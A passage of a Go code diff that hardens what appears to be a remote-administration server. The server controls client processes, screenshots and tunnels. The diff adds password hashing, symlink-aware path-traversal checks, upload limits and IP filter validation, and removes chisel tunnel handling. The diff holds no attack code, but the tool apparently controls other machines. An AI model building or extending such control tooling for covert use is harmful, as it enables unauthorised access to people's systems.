-		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: result.Error.Error()})
-		return
-	}
-
-	if result.RowsAffected > 0 {
-		addLog("PROXY", "CHISEL_TUNNEL_TERMINATED: "+id)
-		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PROXY_DELETED"})
-		return
-	}
-	c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
-}
-
-// ── Process / Screenshot ─────────────────────────────────
-
 func handleGetProcesses(c *gin.Context) {
 	clientID := c.Query("client_id")
 	if clientID == "" {
@@ -2583,7 +2515,18 @@ func handleLogin(c *gin.Context) {
 	password := c.PostForm("password")
 
 	var user User
-	if err := db.Where("username = ? AND password = ?", username, password).First(&user).Error; err == nil {
+	if err := db.Where("username = ?", username).First(&user).Error; err == nil {
+		valid, needsUpgrade := verifyPassword(user.Password, password)
+		if !valid {
+			addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
+			c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
+			return
+		}
+		if needsUpgrade {
+			if passwordHash, hashErr := hashPassword(password); hashErr == nil {
+				db.Model(&user).Update("password", passwordHash)
+			}
+		}
 		session := sessions.Default(c)
 		session.Set("authenticated", true)
 		session.Set("user", user.Username)
@@ -2591,10 +2534,10 @@ func handleLogin(c *gin.Context) {
 
 		addLog("SEC", fmt.Sprintf("LOGIN_SUCCESS: %s from %s", username, c.ClientIP()))
 		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "AUTHENTICATED"})
-	} else {
-		addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
-		c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
+		return
 	}
+	addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
+	c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
 }
 
 func handleLogout(c *gin.Context) {
@@ -2647,7 +2590,9 @@ func handleWS(c *gin.Context) {
 	user := session.Get("user")
 	wsUsername := "Operator"
 	if user != nil {
-		wsUsername = user.(string)
+		if username, ok := user.(string); ok && username != "" {
+			wsUsername = username
+		}
 	}
 
 	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
@@ -2655,6 +2600,7 @@ func handleWS(c *gin.Context) {
 		log.Println("WS upgrade error:", err)
 		return
 	}
+	conn.SetReadLimit(1 << 20)
 
 	wsMutex.Lock()
 	wsClients[conn] = true
@@ -2718,11 +2664,47 @@ func safePath(relPath string) (string, error) {
 	if err != nil {
 		return "", fmt.Errorf("SERVER_ERROR")
 	}
+	// Ensure the managed root exists before resolving symlinks. A fresh
+	// installation otherwise fails every operation because EvalSymlinks(root)
+	// cannot resolve a directory that has not been created yet.
+	if err := os.MkdirAll(root, 0755); err != nil {
+		return "", fmt.Errorf("SERVER_ERROR")
+	}
 	// Ensure resolved path is within root
-	if !strings.HasPrefix(abs, root) {
+	if abs != root && !strings.HasPrefix(abs, root+string(filepath.Separator)) {
+		return "", fmt.Errorf("PATH_TRAVERSAL_DENIED")
+	}
+	// Lexical checks do not protect against symlinks inside the managed root.
+	if !pathWithinRoot(abs, root) {
 		return "", fmt.Errorf("PATH_TRAVERSAL_DENIED")
 	}
 	return abs, nil
+}
+
+// pathWithinRoot resolves the nearest existing ancestor so symlinked parent
+// directories are checked even when the final target does not exist yet.
+func pathWithinRoot(path, root string) bool {
+	rootAbs, err := filepath.Abs(root)
+	if err != nil {
+		return false
+	}
+	rootResolved, err := filepath.EvalSymlinks(rootAbs)
+	if err != nil {
+		return false
+	}
+	rootResolved, _ = filepath.Abs(rootResolved)
+	probe := path
+	for {
+		if resolved, err := filepath.EvalSymlinks(probe); err == nil {
+			resolved, _ = filepath.Abs(resolved)
+			return resolved == rootResolved || strings.HasPrefix(resolved, rootResolved+string(filepath.Separator))
+		}
+		parent := filepath.Dir(probe)
+		if parent == probe {
+			return false
+		}
+		probe = parent
+	}
 }
 
 // handleFMList lists directory contents
@@ -2857,9 +2839,18 @@ func handleFMRename(c *gin.Context) {
 	}
 
 	// New path = same parent + new name
-	newAbs := filepath.Join(filepath.Dir(oldAbs), filepath.Base(req.NewName))
+	newName := strings.TrimSpace(req.NewName)
+	if newName == "" || newName == "." || newName == ".." || strings.ContainsAny(newName, `/\\`) {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_FILENAME"})
+		return
+	}
+	newAbs := filepath.Join(filepath.Dir(oldAbs), newName)
 	root, _ := filepath.Abs(fmRoot)
-	if !strings.HasPrefix(newAbs, root) {
+	if newAbs != root && !strings.HasPrefix(newAbs, root+string(filepath.Separator)) {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PATH_TRAVERSAL_DENIED"})
+		return
+	}
+	if !pathWithinRoot(newAbs, root) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PATH_TRAVERSAL_DENIED"})
 		return
 	}
@@ -2938,6 +2929,7 @@ func handleFMInfo(c *gin.Context) {
 
 // handleFMUploadInit initializes a chunked upload session
 func handleFMUploadInit(c *gin.Context) {
+	const maxUploadChunks = 100000
 	var req struct {
 		FileName    string `json:"file_name" binding:"required"`
 		DestPath    string `json:"dest_path"` // directory to upload into
@@ -2948,9 +2940,18 @@ func handleFMUploadInit(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
+	if req.TotalSize <= 0 || req.TotalSize > maxManagedUploadSize || req.TotalChunks <= 0 || req.TotalChunks > maxUploadChunks {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_UPLOAD_SIZE"})
+		return
+	}
 
 	if req.DestPath == "" {
 		req.DestPath = "/"
+	}
+	fileName := filepath.Base(filepath.Clean(req.FileName))
+	if fileName == "" || fileName == "." || fileName == ".." {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_FILENAME"})
+		return
 	}
 
 	// Validate destination
@@ -2959,7 +2960,10 @@ func handleFMUploadInit(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
-	os.MkdirAll(destAbs, 0755)
+	if err := os.MkdirAll(destAbs, 0755); err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "DEST_DIR_FAILED"})
+		return
+	}
 
 	uploadID := "UP-" + uuid.New().String()[:8]
 
@@ -2969,11 +2973,12 @@ func handleFMUploadInit(c *gin.Context) {
 
 	session := &UploadSession{
 		ID:          uploadID,
-		FileName:    filepath.Base(req.FileName),
+		FileName:    fileName,
 		DestPath:    req.DestPath,
 		TotalSize:   req.TotalSize,
 		TotalChunks: req.TotalChunks,
 		Received:    make(map[int]bool),
+		ChunkSizes:  make(map[int]int64),
 		TempDir:     tmpDir,
 		CreatedAt:   time.Now(),
 	}
@@ -2982,7 +2987,7 @@ func handleFMUploadInit(c *gin.Context) {
 	uploadSessions[uploadID] = session
 	uploadSessionsMu.Unlock()
 
-	addLog("FILE", fmt.Sprintf("UPLOAD_INIT: %s (%d bytes, %d chunks)", req.FileName, req.TotalSize, req.TotalChunks))
+	addLog("FILE", fmt.Sprintf("UPLOAD_INIT: %s (%d bytes, %d chunks)", fileName, req.TotalSize, req.TotalChunks))
 
 	c.JSON(http.StatusOK, APIResponse{
 		Status: "success",
@@ -2995,6 +3000,7 @@ func handleFMUploadInit(c *gin.Context) {
 
 // handleFMUploadChunk receives a single chunk
 func handleFMUploadChunk(c *gin.Context) {
+	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxManagedUploadSize+1<<20)
 	uploadID := c.Param("upload_id")
 
 	uploadSessionsMu.Lock()
@@ -3011,7 +3017,7 @@ func handleFMUploadChunk(c *gin.Context) {
 		chunkIndexStr = c.Query("chunk_index")
 	}
 	chunkIndex, err := strconv.Atoi(chunkIndexStr)
-	if err != nil {
+	if err != nil || chunkIndex < 0 || chunkIndex >= session.TotalChunks {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_CHUNK_INDEX"})
 		return
 	}
@@ -3021,14 +3027,37 @@ func handleFMUploadChunk(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CHUNK_DATA_MISSING: " + err.Error()})
 		return
 	}
-
-	chunkPath := filepath.Join(session.TempDir, fmt.Sprintf("chunk_%06d", chunkIndex))
-	if err := c.SaveUploadedFile(file, chunkPath); err != nil {
-		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CHUNK_SAVE_FAILED: " + err.Error()})
+	if file.Size > session.TotalSize {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CHUNK_EXCEEDS_TOTAL_SIZE"})
 		return
 	}
 
+	// Reserve the chunk's bytes while holding the session lock so duplicate
+	// uploads cannot make temporary storage exceed the declared total size.
 	uploadSessionsMu.Lock()
+	if session.Completed {
+		uploadSessionsMu.Unlock()
+		c.JSON(http.StatusConflict, APIResponse{Status: "error", Message: "UPLOAD_ALREADY_COMPLETING"})
+		return
+	}
+	if session.ChunkSizes == nil {
+		session.ChunkSizes = make(map[int]int64)
+	}
+	previousSize := session.ChunkSizes[chunkIndex]
+	projectedSize := session.ReceivedBytes - previousSize + file.Size
+	if projectedSize > session.TotalSize {
+		uploadSessionsMu.Unlock()
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UPLOAD_EXCEEDS_TOTAL_SIZE"})
+		return
+	}
+	chunkPath := filepath.Join(session.TempDir, fmt.Sprintf("chunk_%06d", chunkIndex))
+	if err := c.SaveUploadedFile(file, chunkPath); err != nil {
+		uploadSessionsMu.Unlock()
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CHUNK_SAVE_FAILED: " + err.Error()})
+		return
+	}
+	session.ChunkSizes[chunkIndex] = file.Size
+	session.ReceivedBytes = projectedSize
 	session.Received[chunkIndex] = true
 	received := len(session.Received)
 	uploadSessionsMu.Unlock()
@@ -3046,10 +3075,33 @@ func handleFMUploadChunk(c *gin.Context) {
 // handleFMUploadComplete merges chunks into final file
 func handleFMUploadComplete(c *gin.Context) {
 	uploadID := c.Param("upload_id")
+	claimed := false
+	completed := false
 
 	uploadSessionsMu.Lock()
 	session, exists := uploadSessions[uploadID]
+	if exists && session.Completed {
+		uploadSessionsMu.Unlock()
+		c.JSON(http.StatusConflict, APIResponse{Status: "error", Message: "UPLOAD_ALREADY_COMPLETING"})
+		return
+	}
+	if exists && len(session.Received) == session.TotalChunks {
+		session.Completed = true
+		claimed = true
+	}
 	uploadSessionsMu.Unlock()
+	if claimed {
+		defer func() {
+			if completed {
+				return
+			}
+			uploadSessionsMu.Lock()
+			if current, ok := uploadSessions[uploadID]; ok && current == session {
+				current.Completed = false
+			}
+			uploadSessionsMu.Unlock()
+		}()
+	}
 
 	if !exists {
 		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "UPLOAD_SESSION_NOT_FOUND"})
@@ -3057,10 +3109,13 @@ func handleFMUploadComplete(c *gin.Context) {
 	}
 
 	// Verify all chunks received
-	if len(session.Received) != session.TotalChunks {
+	uploadSessionsMu.Lock()
+	receivedChunks := len(session.Received)
+	uploadSessionsMu.Unlock()
+	if receivedChunks != session.TotalChunks {
 		c.JSON(http.StatusBadRequest, APIResponse{
 			Status:  "error",
-			Message: fmt.Sprintf("INCOMPLETE: %d/%d chunks received", len(session.Received), session.TotalChunks),
+			Message: fmt.Sprintf("INCOMPLETE: %d/%d chunks received", receivedChunks, session.TotalChunks),
 		})
 		return
 	}
@@ -3072,6 +3127,11 @@ func handleFMUploadComplete(c *gin.Context) {
 		return
 	}
 	finalPath := filepath.Join(destAbs, session.FileName)
+	root, _ := filepath.Abs(fmRoot)
+	if !pathWithinRoot(finalPath, root) {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PATH_TRAVERSAL_DENIED"})
+		return
+	}
 
 	// Merge chunks
 	outFile, err := os.Create(finalPath)
@@ -3095,14 +3155,29 @@ func handleFMUploadComplete(c *gin.Context) {
 	}
 
 	// Cleanup temp
+	if fi, err := outFile.Stat(); err != nil || fi.Size() != session.TotalSize {
+		outFile.Close()
+		os.Remove(finalPath)
+		message := "UPLOAD_SIZE_MISMATCH"
+		if err != nil {
+			message = "UPLOAD_STAT_FAILED: " + err.Error()
+		}
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: message})
+		return
+	}
 	os.RemoveAll(session.TempDir)
 
 	uploadSessionsMu.Lock()
 	delete(uploadSessions, uploadID)
 	uploadSessionsMu.Unlock()
+	completed = true
 
-	fi, _ := os.Stat(finalPath)
-	root, _ := filepath.Abs(fmRoot)
+	fi, err := os.Stat(finalPath)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "STAT_FAILED: " + err.Error()})
+		return
+	}
+	root, _ = filepath.Abs(fmRoot)
 	relFinal, _ := filepath.Rel(root, finalPath)
 	relFinal = "/" + strings.ReplaceAll(relFinal, "\\", "/")
 
@@ -3513,13 +3588,33 @@ func handleUpdateFilters(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
+	for _, entries := range [][]string{req.IPWhitelist, req.IPBlacklist} {
+		for _, entry := range entries {
+			entry = strings.TrimSpace(entry)
+			valid := net.ParseIP(entry) != nil
+			if strings.Contains(entry, "/") {
+				_, _, err := net.ParseCIDR(entry)
+				valid = err == nil
+			}
+			if !valid {
+				c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_IP_FILTER: " + entry})
+				return
+			}
+		}
+	}
 
 	filterMutex.Lock()
 	if req.IPWhitelist != nil {
-		ipWhitelist = req.IPWhitelist
+		ipWhitelist = make([]string, 0, len(req.IPWhitelist))
+		for _, entry := range req.IPWhitelist {
+			ipWhitelist = append(ipWhitelist, strings.TrimSpace(entry))
+		}
 	}
 	if req.IPBlacklist != nil {
-		ipBlacklist = req.IPBlacklist
+		ipBlacklist = make([]string, 0, len(req.IPBlacklist))
+		for _, entry := range req.IPBlacklist {
+			ipBlacklist = append(ipBlacklist, strings.TrimSpace(entry))
+		}
 	}
 	filterMutex.Unlock()
 
